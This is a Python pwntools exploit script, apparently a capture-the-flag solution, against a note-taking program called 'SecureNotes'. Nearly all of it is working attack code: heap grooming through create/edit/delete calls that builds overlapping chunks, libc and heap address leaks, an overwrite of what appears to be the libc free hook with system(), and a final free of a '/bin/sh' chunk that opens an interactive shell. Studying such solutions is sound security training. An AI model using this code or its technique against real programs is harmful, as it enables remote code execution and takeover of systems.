#!/usr/bin/env python3



from pwn import *


e = ELF("./SecureNotes")
r = process("./SecureNotes")
#r = remote("pwn.1nf1n1ty.team",32338)
libc = ELF("./libc.so.6")

def create(idx,data):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Enter the id of note:",f"{idx}")
    r.sendafter(b"Enter the note:",data)


def edit(idx,data):
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"Enter the id of note:",f"{idx}")
    r.sendafter(b"Enter the note:",data)

def delete(idx):
    r.sendlineafter(b">>",b"3")
    r.sendlineafter(b"Enter the id of note:",f"{idx}")

def read(idx):
    r.sendlineafter(b">>",b"4")
    r.sendlineafter(b"Enter the id of note:",f"{idx}")




for i in range(0,0x7):
    create(i,b"A" * 0x207)
for i in range(0x7,0xe):
    create(i,b"A" * 0xf7)
for i in range(0xe,0x10):
    create(i,b"A" * 0x67)
create(0x10,b"A" * 0x207)
edit(0x10,b"A" * 0x1f8 + p64(0x111))
edit(0x10,b"A" * 0x1f0 + p64(0x200))
#create(0x10,b"A" * 0x1f0 + p64(0x200) + p64(0x111))
create(0x11,b"A" * 0xf7)
create(0x12,b"A" * 0x67)
for i in range(0,7):
    delete(i)
for i in range(0x7,0xe):
    delete(i)
delete(0x10)
#delete(0xe)
delete(0xf)
create(0xf,b"A" * 0x68)
for i in range(0x13,0x1a):
    create(i,b"A" * 0xf7)
#for i in range(0,
#edit(0xf,b"A" * 0x20 + p64(0x30))
create(0x1a,b"A" * 0xf7)
create(0x1b,b"A" * 0x67)
for i in range(0x13,0x1a):
    delete(i)
delete(0x1b)
delete(0xe)
delete(0x1a)
delete(0x11)
#create(0x1,b"A" * 0x27)
#create(0x0,b"A" * 0x27)
create(0x1d,b"B" * 0x67)
create(0x1e,b"C" * 0x67)
create(0x1f,b"D" * 0xd7)
create(0x20,b"E" * 0x17)
read(30)
libc_leak = u64(r.recvline().strip().strip(b"\n>>\n").decode('latin-1').ljust(8,'\x00')) - 0x3ebca0
log.info("The libc base of the process is " + hex(libc_leak))
create(0x21,b"F" * 8)
create(0x22,b"G" * 8)
delete(0x22)
delete(0x21)
read(30)
heap_leak = u64(r.recvline().strip().strip(b"\n>>\n").decode('latin-1').ljust(8,'\x00')) - 0x19d0
log.info("The heap base of the process is " + hex(heap_leak))
#create(0x23,b"A" * 16)
edit(30,p64(libc_leak + 0x3ed8e8))
create(0x23,b"/bin/sh\x00")
create(0x24,p64(libc_leak + libc.sym.system))
delete(0x23)
#create(0x21,b"F" * 0x17)
#edit(0x1c,b"Z" * 0x8)
#read(0x1c)
r.interactive()
#r.interactive()
#r.interactive()
 
 
 
